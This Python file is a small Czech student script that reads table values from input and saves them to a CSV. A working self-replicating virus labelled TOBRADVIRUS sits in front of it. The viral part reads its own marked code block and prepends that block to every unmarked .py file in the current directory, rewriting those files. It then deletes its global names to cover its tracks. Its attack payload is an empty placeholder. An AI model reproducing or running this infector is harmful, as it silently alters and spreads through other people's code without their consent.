#!/usr/bin/env python3
# begin-TOBRADVIRUS

import glob

SIGNATURE = 'TOBRADVIRUS'
VERSION = '1.0'
fileType = '*.py'
trigger = False


def get_content_file(file_path):
    with open(file_path, 'r') as f:
        content = f.readlines()

    return content

def get_main_code():
    in_progress = False
    main_code = []

    content = get_content_file(__file__)

    for line in content:
        if f'# begin-{SIGNATURE}\n' in line:
            in_progress = True
        if in_progress:
            main_code.append(line)
        if f'# end-{SIGNATURE}\n' in line:
            break

    return main_code


def find_files_to_infect():
    return [filename for filename in glob.glob(fileType)]


def get_content_if_infectable(file_path):
    content = get_content_file(file_path)
    for line in content:
        if SIGNATURE in line:
            return None
    return content


def infect(file_path, main_code):
    if content := get_content_if_infectable(file_path):
        with open(file_path, 'w') as i_f:
            i_f.write('#!/usr/bin/env python3\n')
            i_f.write(''.join(main_code))
            i_f.writelines(content)


def attack():
    if trigger:
        pass

try:
    maincode = get_main_code()

    for file in find_files_to_infect():
        infect(file, maincode)

    attack()

finally:
    for i in list(globals().keys()):
        if i[0] != '_':
            exec(f'del {i}')

# end-TOBRADVIRUS#!/usr/bin/env python3

radky = int(input('Zadej pocet radku: '))
sloupce = int(input('Zadej pocet sloupcu: '))

tabulka = []
radek = []

for r in range(1, radky+1):
    for s in range(1, sloupce+1):
        hodnota = input(f'Zadej hodnotu pro {r}. radek a {s}. sloupec: ')
        radek.append(hodnota)
    tabulka.append(radek)
    radek = []
print(tabulka)

f = open('tabulka.csv', 'w')
for radek in tabulka:
    zapis = ''
    for sloupec in radek:
        zapis = zapis + sloupec + ';'
    f.writelines(zapis)
    f.write('\n')
f.close()